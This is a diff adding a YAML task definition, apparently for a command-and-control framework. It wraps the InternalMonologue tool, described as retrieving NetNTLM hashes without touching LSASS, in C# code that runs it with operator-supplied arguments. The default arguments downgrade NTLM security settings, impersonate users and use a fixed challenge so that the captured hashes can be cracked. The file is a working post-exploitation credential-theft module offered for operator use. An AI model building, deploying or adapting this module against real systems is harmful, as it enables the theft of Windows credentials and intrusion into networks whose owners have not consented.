@@ -1,0 +1,131 @@
+- Name: InternalMonologue
+  Aliases: []
+  Description: Use an InternalMonologue command.
+  Author: 
+      Name: Elad Shamir
+      Handle: elad_shamir
+      Link: https://twitter.com/elad_shamir
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: |
+    using System;
+    using System.IO;
+    using System.Reflection;
+
+    using InternalMonologue;
+    using InternalMonologue.StringExtensions;
+    
+    public static class Task
+    {
+        public static Stream OutputStream { get; set; }
+        public static string Execute(string Command)
+        {
+            try
+            {
+                TextWriter realStdOut = Console.Out;
+                TextWriter realStdErr = Console.Error;
+                StreamWriter stdOutWriter = new StreamWriter(OutputStream);
+                StreamWriter stdErrWriter = new StreamWriter(OutputStream);
+                stdOutWriter.AutoFlush = true;
+                stdErrWriter.AutoFlush = true;
+                Console.SetOut(stdOutWriter);
+                Console.SetError(stdErrWriter);
+                
+                string[] args = Command.Split(' ');
+                //typeof(InternalMonologue.Program).GetMethod("Main", BindingFlags.NonPublic | BindingFlags.Static).Invoke(null, new object[] { args });
+                try
+                {
+                    Program.Main(args);
+                }
+                catch (Exception e)
+                {
+                    Console.WriteLine("\r\n[!] Unhandled InternalMonlogue exception:\r\n");
+                    Console.WriteLine(e);
+                }
+                Console.Out.Flush();
+                Console.Error.Flush();
+                Console.SetOut(realStdOut);
+                Console.SetError(realStdErr);
+                
+                OutputStream.Close();
+                return "";
+            }
+            catch (Exception e)
+            {
+              if (OutputStream != null)
+              {
+                OutputStream.Close();
+              }
+              return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace;
+            }
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: Command
+    Value: ''
+    DefaultValue: -Downgrade True -Restore True -Impersonate True -Thread False -Verbose False -Challenge 1122334455667788
+    Description: InternalMonologue command to execute.
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries:
+  - Name: InternalMonologue
+    Description: InternalMonologue is a C# tool for retrieving NetNTLM Hashes without Touching LSASS.
+    Location: InternalMonologue\
+    Language: CSharp
+    CompatibleDotNetVersions:
+    - Net35
+    - Net40
+    ReferenceAssemblies:
+    - Name: System.Security.dll
+      Location: net40\System.Security.dll
+      DotNetVersion: Net40
+    - Name: System.Security.dll
+      Location: net35\System.Security.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net40\System.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net35\System.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net40\System.Core.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net35\System.Core.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net40\mscorlib.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net35\mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.Data.DataSetExtensions.dll
+      Location: net40\System.Data.DataSetExtensions.dll
+      DotNetVersion: Net40
+    - Name: System.Data.DataSetExtensions.dll
+      Location: net35\System.Data.DataSetExtensions.dll
+      DotNetVersion: Net35
+    - Name: System.Data.dll
+      Location: net40\System.Data.dll
+      DotNetVersion: Net40
+    - Name: System.Data.dll
+      Location: net35\System.Data.dll
+      DotNetVersion: Net35
+    - Name: System.XML.dll
+      Location: net40\System.XML.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net35\System.XML.dll
+      DotNetVersion: Net35
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
